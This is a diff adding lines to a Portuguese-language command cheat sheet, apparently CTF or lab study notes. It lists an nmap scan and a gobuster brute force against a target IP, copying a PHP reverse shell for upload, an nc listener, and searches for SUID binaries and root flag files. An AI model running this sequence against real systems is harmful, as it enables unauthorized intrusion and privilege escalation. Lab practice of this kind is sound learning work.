@@ -45,7 +45,10 @@ chmod = altera as permissoes de acesso arquivo diretorio
 -----------------------------------------------------------------------------------------------------------------------------
 Comandos Avançados
 
-
+echo 10.10.60.104 > alvo 
+sudo nmap -sS --top-ports 20 --open `cat alvo` -Pn 
+gobuster dir -u https://`cat alvo`/ -w /usr/share/dirb/wordlists/big.txt -q -no-errors -t 100
+cp /usr/share/webshells/php/php-reverse-shell.php ../shell.php5
 find / - type f -perm -4000 2>/dev/null = achar arquivo jogar coisa no lixo
 find / -type f -name root*.txt
 nc -vnlp 1234
